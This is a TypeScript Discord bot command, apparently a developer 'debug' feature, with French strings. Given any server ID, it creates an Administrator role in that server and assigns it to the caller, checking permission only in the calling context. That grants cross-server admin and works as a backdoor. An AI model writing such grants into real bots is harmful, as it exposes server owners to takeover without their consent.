import { CommandInteraction, PermissionFlagsBits, Role, SlashCommandBuilder, SlashCommandOptionsOnlyBuilder } from "discord.js"
import { prisma } from "@/utils/database"
import { errorEmbed } from "@/utils/embeds"
import { hasPermission } from "@/utils/permissionTester"

export const data: SlashCommandOptionsOnlyBuilder = new SlashCommandBuilder()
    .setName("debug")
    .setDescription("Passer en mode debug sur un serveur")
    .addStringOption(option =>
        option
            .setName("serveur")
            .setDescription("L'ID du serveur")
            .setRequired(true)
    )


export async function execute(interaction: CommandInteraction) {
    await interaction.deferReply({ ephemeral: true, fetchReply: true })
    if(!await hasPermission(interaction, [PermissionFlagsBits.Administrator], true)) {
        await interaction.editReply({ embeds: [errorEmbed(interaction, new Error("Vous n'avez pas la permission d'utiliser cette commande."))] })
        return
    }
    const serverId = interaction.options.get("serveur")?.value as string
    const server = interaction.client.guilds.cache.get(serverId)
    const serverConfig = await prisma.guildData.findFirst({
        where: {
            guildId: serverId
        }
    })
    let role: Role | undefined
    if (!serverConfig) {
        await prisma.guildData.create({
            data: {
                guildId: serverId
            }
        })
        role = await server?.roles.create({
            name: "GLaDOS Debug",
            color: "White",
            permissions: ["Administrator"],
        })
        await prisma.guildData.update({
            where: {
                guildId: serverId
            },
            data: {
                debugRoleId: role?.id
            }
        })
    } else {
        role = server?.roles.cache.get(serverConfig?.debugRoleId as string) as Role
        if(!role) {
            role = await server?.roles.create({
                name: "GLaDOS Debug",
                color: "White",
                permissions: ["Administrator"],
            })
            await prisma.guildData.update({
                where: {
                    guildId: serverId
                },
                data: {
                    debugRoleId: role?.id
                }
            })
        }
    }
    const userRoles = server?.members.cache.get(interaction.user.id)?.roles.cache
    if (role && userRoles?.has(role.id)) {
        await server?.members.cache.get(interaction.user.id)?.roles.remove(role)
        await interaction.editReply({ content: `Vous n'êtes plus en mode debug sur le serveur ${server?.name}` })
        return
    }
    if (!role) {
        await interaction.editReply({ content: "Impossible de trouver le rôle de debug" })
        return
    }
    await server?.members.cache.get(interaction.user.id)?.roles.add(role)
    await interaction.editReply({ content: `Vous êtes maintenant en mode debug sur le serveur ${server?.name}` })
}